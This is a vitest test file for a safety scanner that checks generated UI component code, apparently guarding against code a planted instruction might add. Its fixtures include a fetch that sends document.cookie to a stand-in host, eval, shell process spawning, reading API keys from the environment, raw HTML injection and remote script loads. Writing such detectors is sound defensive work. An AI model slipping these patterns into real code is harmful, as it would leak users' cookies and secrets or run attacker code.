import { describe, expect, it } from "vitest";
import { scanSafety } from "../src/verify/safety.ts";

const scan = (content: string, path = "Card.tsx") => scanSafety([{ path, content }]);

describe("scanSafety", () => {
  it("passes an ordinary component in every language", () => {
    const clean = [
      `import { Button } from "@carbon/react";\nexport function Card({ image }: { image: string }) {\n  return <div data-figma-id="1:2"><img src={image} alt="Tomato" /><a href="https://example.com/terms">Terms</a><Button>Buy</Button></div>;\n}`,
      `<template><el-button type="primary">{{ label }}</el-button></template>\n<script setup lang="ts">\nimport { ElButton } from "element-plus";\n</script>`,
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z"/></svg>`,
      `// fetch() is never called here: the app passes the data in.\nconst x = 1;`,
      `/* eval( and localStorage in a comment */ export const y = 2;`,
      `expect(screen.getByRole("button").innerHTML === "").toBe(false);`,
      `Text("Visit https://tulparsi.com for more", style = MaterialTheme.typography.bodyMedium)`,
      `@Composable fun Card(image: Painter) { Image(painter = image, contentDescription = "Tomato") }`,
      `<MudButton Color="Color.Primary">Buy</MudButton>`,
    ];
    for (const c of clean) expect(scan(c).findings, c).toEqual([]);
  });

  it("fails what a planted instruction would add", () => {
    const cases: [string, RegExp][] = [
      [`useEffect(() => { fetch("https://evil.example/c?d=" + document.cookie); }, []);`, /fetch\(\) calls the network/],
      [`navigator.sendBeacon("/x", data)`, /sendBeacon/],
      [`const ws = new WebSocket("wss://x.example")`, /opens a connection/],
      [`eval(props.code)`, /eval\(\) runs code/],
      [`const f = new Function("return 1")`, /new Function/],
      [`setTimeout("alert(1)", 10)`, /timer given a string/],
      [`<a href="javascript:alert(1)">x</a>`, /javascript: URL/],
      [`localStorage.setItem("token", t)`, /stored data/],
      [`const key = process.env.OPENAI_API_KEY;`, /environment variables/],
      [`<div dangerouslySetInnerHTML={{ __html: text }} />`, /raw HTML/],
      [`el.innerHTML = props.text;`, /raw HTML/],
      [`<div v-html="text"></div>`, /raw HTML/],
      [`<div>{@html text}</div>`, /raw HTML/],
      [`@((MarkupString)Text)`, /raw HTML/],
      [`var key = Environment.GetEnvironmentVariable("SECRET");`, /environment variables/],
      [`String k = System.getenv("SECRET");`, /environment variables/],
      [`new ProcessBuilder("sh", "-c", cmd).start();`, /starts a process/],
      [`let out = std::process::Command::new("sh");`, /starts a process/],
      [`let r = reqwest::get(url).await;`, /HTTP client/],
      [`final r = await http.get(uri); import 'package:http/http.dart' as http;`, /HTTP client/],
    ];
    for (const [code, message] of cases) expect(scan(code).findings.join("\n"), code).toMatch(message);
  });

  it("fails code that loads from the web, and names the host", () => {
    for (const code of [
      `<img src="https://images.unsplash.com/photo-1.jpg" alt="" />`,
      `@import url("https://fonts.googleapis.com/css2?family=Inter");`,
      `<script src="https://cdn.evil.example/x.js"></script>`,
      `import confetti from "https://esm.sh/canvas-confetti";`,
      `Image.network("https://picsum.photos/200")`,
      `AsyncImage(model = "https://picsum.photos/200", contentDescription = null)`,
      `add(new Image("https://picsum.photos/200", "Tomato"));`,
      `.hero { background: url(//cdn.example.com/a.png); }`,
    ]) {
      const r = scan(code);
      expect(r.findings.join("\n"), code).toMatch(/loads (?:[\w.-]+ from the web|fonts from [\w.-]+: the app loads its own fonts)/);
      expect(r.hosts.length, code).toBe(1);
    }
  });

  it("names the file and line", () => {
    const r = scanSafety([{ path: "src/Card.vue", content: `<template>\n  <div v-html="x" />\n</template>` }]);
    expect(r.findings).toEqual(["✗ src/Card.vue:2 writes raw HTML: render the text as text."]);
  });
});
